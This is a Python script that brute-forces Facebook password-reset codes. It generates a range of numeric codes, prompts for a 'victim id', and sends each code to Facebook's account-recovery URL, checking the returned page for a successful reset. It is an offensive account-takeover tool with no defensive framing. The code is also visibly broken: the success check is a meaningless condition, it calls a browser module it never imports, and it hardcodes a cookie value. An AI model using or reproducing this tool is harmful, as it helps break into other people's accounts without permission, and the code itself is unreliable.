#!/usr/bin/python3

import sys 
import cookiejar as cookielib
from urllib.request import urlopen
from mechanize import *
import requests
from bs4 import *
from colorama import Fore, Back, Style 
#import mechanicalsoup


#genarating code to use it for brute forcing
first_code = int(input(Back.BLUE+"Insert First Code: "))

last_code = int(input("Insert Last Code: "))
print('''
    ============ Menu ==============
    1- Reset Code Facebook 
    0- To Exit''')
choice=input(Fore.YELLOW+"Enter your choice : ")

print(Style.RESET_ALL) 
with open ('codes.txt','w') as f:
	for i in range(first_code,last_code):
		if len(str(i))<=5:
			f.write(f'0{str(i)}\n')
		else:
			f.write(f'{str(i)}\n')

headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
	}
payload={}
cookie={}

def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	rep= 'https://m.facebook.com/recover/password?u='+target+'&n='+str(k)+'&s=23&exp_locale=ar_AR&redirect_from=button'

	data=requests.get(rep,headers=headers)
	for i in data.cookies:
		cookie[i.name]=i.value
	data=urlopen(rep).read()
	return (form,cookie)

def function(passw):
	global payload,cookie
	rep= 'https://m.facebook.com/recover/password?u='+target+'&n='+str(k)+'&s=23&exp_locale=ar_AR&redirect_from=button'
	payload,cookie=create_form()
	r=requests.get(rep,cookies=cookie,headers=headers)
	bs= BeautifulSoup(r.text,"html.parser")
	lst=[]
	for i in bs.findAll('span'):
		div=i.get_text()
		lst.append(div)
	for j in lst:
		if j =='HIDE'and 'SHOW'and 'Continue'and 'Skip' :
			print('\033[1;32;40m \npassword is : ',passw)
			webbrowser.open(r)
			sys.exit(1)
	else:
		print('false')

target=input(Back.GREEN+'Enter you victim id :> ')

if choice =='1':
		f= open('codes.txt', 'r',encoding='utf-8')
		w=f.read()
		print(Fore.RED+"Facebook code loaded \!/\n")
		print(Style.RESET_ALL) 
		l = w.split('\n')
		for k in l:
				print(Fore.RED+'trying ..',k)
				function(k)
	
    